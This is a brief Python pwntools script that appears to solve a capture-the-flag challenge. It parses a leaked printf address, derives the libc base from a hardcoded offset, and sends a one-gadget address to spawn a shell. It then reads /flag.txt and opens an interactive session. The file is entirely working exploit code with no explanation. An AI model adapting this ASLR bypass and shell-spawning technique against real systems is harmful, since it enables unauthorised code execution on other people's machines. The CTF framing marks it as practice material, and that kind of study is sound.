import os

nc, host, port = os.getenv("CONNECT").split(" ")

from pwn import remote

offset = 0xEF2D3

conn = remote(host, port)
conn.recvuntil(b"printf @ ")
printf_runtime_addr = int(conn.recvline().strip().decode(), 16)

print(f"printf runtime address: {hex(printf_runtime_addr)}")

printf_offset = 0x60100
base_addr = printf_runtime_addr - printf_offset

conn.sendlineafter(b"> ", hex(base_addr + offset).encode())
conn.sendline(b"cat /flag.txt")
conn.interactive()
